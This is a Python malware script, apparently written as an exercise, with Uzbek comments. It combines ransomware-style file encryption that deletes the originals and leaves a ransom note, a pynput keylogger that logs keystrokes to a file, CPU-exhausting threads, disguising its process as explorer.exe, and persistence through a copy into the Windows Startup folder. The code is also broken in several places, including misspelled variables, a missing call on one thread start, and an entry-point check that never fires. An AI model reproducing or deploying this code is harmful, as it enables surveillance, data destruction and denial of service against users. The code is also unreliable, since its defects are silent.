import os
import threading
import time
import shutil
import psutil
import base64
from cryptography.fernet import Fernet
from pynput.keyboard import Listener
import sys
import random

# shifrlash kaliti
key = Fernet.generate_key()
cipher = Fernet(key)
# logg fili
LOG_FILE = "keystores.txt"


def encrypt_file(file_path):
    """fayillarni shifrlash (ransomwer simulyatsiyasi)"""
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
        encrypted_data = cipher.encrypt(file_data)
        with open(file_path + ".enc", "wb") as f:
            f.write(encrypted_data)
        os.remove(file_path)  # asl fileni ochirish
        return True
    except:
        return False


def ransomware():
    """barcha fayillarni shifrlash"""
    target_dir = "test_victim"
    if not os.path.exists(target_dir):
        os.mkdir(target_dir)
        with open(os.path.join(target_dir, "example.txt"), "w") as f:
            f.write("bu sinov faylii")
    for root, _, files in os.walk(target_dir):
        for file in files:
            file_path = os.path.join(root, file)
            if not file.endswith(".enc"):
                encrypt_file(file_path)


# foydalanuvchiga xabar
with open("README.txt", "w") as f:
    f.write(f"fayillaringiz shifrlangan! kalit: {base64.b64decode(key).decode()}")


def keylogger():
    """klaviatura bosimlarini yozib olish"""

    def on_press(key):
        with open(LOG_FILE, "a") as f:
            f.write(f"{time.ctime()} - {str(key)}\n")

    with Listener(on_press=on_press) as listener:
        listener.join()


def overload_system():
    """tizimni quliflash yoki haddan tashqari yuklash"""

    def cpu_killer():
        while True:
            random.random()  # cpuga yuklama

    # 10ta thread ocib tizimni zoriqtirish

    for _ in range(10):
        threading.Thread(target=cpu_killer, daemon=True).start()


def hide_process():
    try:
        psutil.Process().name = "explorer.exe"
    except:
        pass


def persistnece():
    if os.name == "nt":
        script_path = os.path.abspath(__file__)
        statup_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programms\Startup")
        shutil.copy(scipt_path, startup_path + "\\systme_update.py")


def backdoor_main():
    hide_process()
    persistnece()

    threading.Thread(target=ransomware, daemon=True).start
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=overload_system, daemon=True).start()
    while True:
        time.sleep(60)


if __name__ == "__name__":
    threading.Thread(backdoor_main, daemon=True).start()
    while True:
        time.sleep(1000)
